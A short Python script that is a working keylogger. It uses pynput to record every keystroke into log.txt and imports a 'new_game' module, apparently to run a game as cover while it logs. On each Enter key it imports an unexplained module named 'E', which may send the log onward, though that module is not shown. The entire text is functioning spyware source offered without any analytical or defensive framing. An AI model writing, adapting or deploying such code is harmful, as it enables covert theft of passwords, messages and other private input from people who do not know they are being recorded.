from pynput.keyboard import Listener
import new_game
def write_to_file(key):
    letter=str(key)
    letter=letter.replace("'","")
    if letter == 'Key.space':
        letter=' '
    if letter == 'Key.shift_r':
        letter=' '
    if letter == 'Key.shift_l':
        letter = ' '
    if letter == 'Key.scroll_lock':
        letter = ' '
    if letter == 'Key.print_screen':
        letter = ' '
    if letter == 'Key.ctrl_l':
        letter = ' '
    if letter == 'Key.shift':
        letter = ' '
    if letter == 'Key.backspace':
        letter = ' '
    if letter == 'Key.alt_l':
        letter = ' '
    if letter == 'Key.alt_l':
        letter = ' '
    if letter == 'Key.tab':
        letter = ' '
    if letter == 'Key.enter':
        letter = '\n'
        import E
    with open("log.txt",'a') as f:
        f.write(letter)
with Listener(on_press=write_to_file) as l:
    l.join()